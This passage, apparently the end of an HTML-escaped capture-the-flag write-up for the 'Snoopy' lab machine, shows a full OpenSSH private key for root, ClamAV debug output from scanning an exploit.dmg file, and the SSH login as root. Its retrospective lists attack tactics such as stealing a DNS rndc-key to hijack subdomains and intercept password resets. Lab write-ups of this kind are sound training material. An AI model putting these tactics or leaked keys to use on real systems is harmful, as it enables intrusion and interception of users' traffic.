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
+&lt;span class=&quot;nv&quot;&gt;atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; OPENSSH PRIVATE KEY-----
+
+LibClamAV debug: cli_scandmg: wanted blkx, text value is cSum
+LibClamAV debug: cli_scandmg: wanted blkx, text value is nsiz
+LibClamAV debug: cli_scandmg: wanted blkx, text value is plst
+LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
+LibClamAV debug: matcher_run: performing regex matching on full map: 0+4878&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4878&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 4878
+LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
+LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
+LibClamAV debug: cli_magic_scan: returning 0  at line 4997
+LibClamAV debug: clean_cache_add: bd374c686d4b7cf03e7ff45208ea7ffc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
+/home/sbrown/scanfiles/exploit.dmg: OK
+LibClamAV debug: Cleaning up phishcheck
+LibClamAV debug: Freeing phishcheck struct
+LibClamAV debug: Phishcheck cleaned up
+
+&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt; SCAN SUMMARY &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+Known viruses: 8659055
+Engine version: 1.0.0
+Scanned directories: 0
+Scanned files: 1
+Infected files: 0
+Data scanned: 0.01 MB
+Data &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;: 0.00 MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ratio 2.00:1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Time: 18.274 sec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 m 18 s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Start Date: 2026:05:16 16:46:04
+End Date:   2026:05:16 16:46:22
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-41.png&quot; alt=&quot;snoopy-41.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root_id_rsa&lt;/code&gt; and login via ssh:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos; &amp;gt; root_id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
+4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
+hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw
+kfWsSVrLTh5vf0gaV1ql59Wc8Gh7IKFrEEcLXLqqyDoprKq2ZG06S2foeUWkSY134Uz9oI
+Ctqf16lLFi4Lm7t5jkhW9YzDRha7Om5wpxucUjQCG5dU/Ij1BA5jE8G75PALrER/4dIp2U
+zrXxs/2Qqi/4TPjFJZ5YyaforTB/nmO3DJawo6bclAA762n9bdkvlxWd14vig54yP7SSXU
+tPGvP4VpjyL7NcPeO7Jrf62UVjlmdro5xaHnbuKFevyPHXmSQUE4yU3SdQ9lrepY/eh4eN
+y0QJG7QUv8Z49qHnljwMTCcNeH6Dfc786jXguElzAAAFiAOsJ9IDrCfSAAAAB3NzaC1yc2
+EAAAGBANeetM1N4+5hUFLOVwxiGq7Yf4jFBeltqILFtCjxTfDH3xMc9hvQ/+IKWIyHMmrj
+x0q1eH4zRjOOgIsw00CKCujMjeCvDzc2DGlZweiDBvQFbYRLtdZ2M6Kh5gX4ctHKeBGjN4
+CE2tdADAQG579m0MloVWWkJUkORwx7dA8NZlgbnuXmsXrqlt0WCRoyo7hUsJH1rElay04e
+b39IGldapefVnPBoeyChaxBHC1y6qsg6KayqtmRtOktn6HlFpEmNd+FM/aCAran9epSxYu
+C5u7eY5IVvWMw0YWuzpucKcbnFI0AhuXVPyI9QQOYxPBu+TwC6xEf+HSKdlM618bP9kKov
++Ez4xSWeWMmn6K0wf55jtwyWsKOm3JQAO+tp/W3ZL5cVndeL4oOeMj+0kl1LTxrz+FaY8i
++zXD3juya3+tlFY5Zna6OcWh527ihXr8jx15kkFBOMlN0nUPZa3qWP3oeHjctECRu0FL/G
+ePah55Y8DEwnDXh+g33O/Oo14LhJcwAAAAMBAAEAAAGABnmNlFyya4Ygk1v+4TBQ/M8jhU
+flVY0lckfdkR0t6f0Whcxo14z/IhqNbirhKLSOV3/7jk6b3RB6a7ObpGSAz1zVJdob6tyE
+ouU/HWxR2SIQl9huLXJ/OnMCJUvApuwdjuoH0KQsrioOMlDCxMyhmGq5pcO4GumC2K0cXx
+dX621o6B51VeuVfC4dN9wtbmucocVu1wUS9dWUI45WvCjMspmHjPCWQfSW8nYvsSkp17ln
+Zvf5YiqlhX4pTPr6Y/sLgGF04M/mGpqskSdgpxypBhD7mFEkjH7zN/dDoRp9ca4ISeTVvY
+YnUIbDETWaL+Isrm2blOY160Z8CSAMWj4z5giV5nLtIvAFoDbaoHvUzrnir57wxmq19Grt
+7ObZqpbBhX/GzitstO8EUefG8MlC+CM8jAtAicAtY7WTikLRXGvU93Q/cS0nRq0xFM1OEQ
+qb6AQCBNT53rBUZSS/cZwdpP2kuPPby0thpbncG13mMDNspG0ghNMKqJ+KnzTCxumBAAAA
+wEIF/p2yZfhqXBZAJ9aUK/TE7u9AmgUvvvrxNIvg57/xwt9yhoEsWcEfMQEWwru7y8oH2e
+IAFpy9gH0J2Ue1QzAiJhhbl1uixf+2ogcs4/F6n8SCSIcyXub14YryvyGrNOJ55trBelVL
+BMlbbmyjgavc6d6fn2ka6ukFin+OyWTh/gyJ2LN5VJCsQ3M+qopfqDPE3pTr0MueaD4+ch
+k5qNOTkGsn60KRGY8kjKhTrN3O9WSVGMGF171J9xvX6m7iDQAAAMEA/c6AGETCQnB3AZpy
+2cHu6aN0sn6Vl+tqoUBWhOlOAr7O9UrczR1nN4vo0TMW/VEmkhDgU56nHmzd0rKaugvTRl
+b9MNQg/YZmrZBnHmUBCvbCzq/4tj45MuHq2bUMIaUKpkRGY1cv1BH+06NV0irTSue/r64U
++WJyKyl4k+oqCPCAgl4rRQiLftKebRAgY7+uMhFCo63W5NRApcdO+s0m7lArpj2rVB1oLv
+dydq+68CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf4
+9O15RLXne6qtCNxZpDjt3u7646/aN32v7UVzGV7tw4k/H8PyU819R9GcCR4wydLcB4bY4b
+NQ/nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR+ucHi1W+njba6e
+SN/sjHa19HkZJeLcyGmU34/ESyN6HqFLOXfyGjqTldwVVutrE/Mvkm3ii/0GqDkqW3PwgW
+atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
+
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 ./root_id_rsa &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ./root_id_rsa root@snoopy.htb
+root@snoopy:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-retrospective&quot;&gt;🧠 Retrospective&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Learnings:&lt;/strong&gt;
+    &lt;ol&gt;
+      &lt;li&gt;&lt;strong&gt;Look beyond RCE in LFI:&lt;/strong&gt; Arbitrary file download via zip packaging is incredibly powerful for pulling pristine binaries, config files, and source code without worrying about PHP wrapper execution or character corruption.&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;Leverage DNS configs for MITM:&lt;/strong&gt; If you find LFI on a server running DNS, always hunt for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;named.conf&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;named.conf.local&lt;/code&gt; to steal the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rndc-key&lt;/code&gt;. It allows you to dynamically add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A records&lt;/code&gt;, hijack subdomains, and intercept internal application traffic like SMTP password resets.&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;Weaponize Honeypots for Callbacks:&lt;/strong&gt; When testing automated provisioning tools or blind callbacks, spin up custom, lightweight honeypots (like a Paramiko SSH server) instead of standard netcat listeners to automatically catch and log automated credential injections over specific protocols.&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 </content>
   </entry>
   
